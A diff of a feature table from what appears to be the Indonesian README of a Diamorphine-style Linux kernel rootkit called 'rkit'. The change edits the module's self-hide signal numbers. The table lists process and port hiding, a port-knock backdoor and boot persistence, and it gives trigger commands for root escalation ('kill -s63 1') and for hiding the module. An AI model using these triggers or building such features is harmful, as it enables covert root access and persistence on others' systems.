@@ -40,7 +40,7 @@ build, vermagic-check, load, dan memasang auto-load saat boot.
 | Sembunyikan PID | ✅ param `hidepid=` | ✅ | ✅ |
 | Sembunyikan **koneksi** (port di `/proc/net/*`) | ✅ param `hideport=` | ✅ `rkit hide port` | ✅ |
 | LPE: `kill -s63 1` | ✅ | ✅ | ✅ |
-| **Self-hide modul** | ✅ `kill -s64/65` | ✅ `rkit hide/unhide mod` | ✅ |
+| **Self-hide modul** | ✅ `kill -s64/62` | ✅ `rkit hide/unhide mod` | ✅ |
 | **Backdoor port-knock** (opt-in `backdoor_ip`) | ✅ | ✅ | ✅ |
 | Auto-load saat boot + restore state | ✅ | ✅ | ✅ |
 | Kontrol runtime | sinyal (gaya Diamorphine) | `/proc/rkit` | `/proc/rkit` |
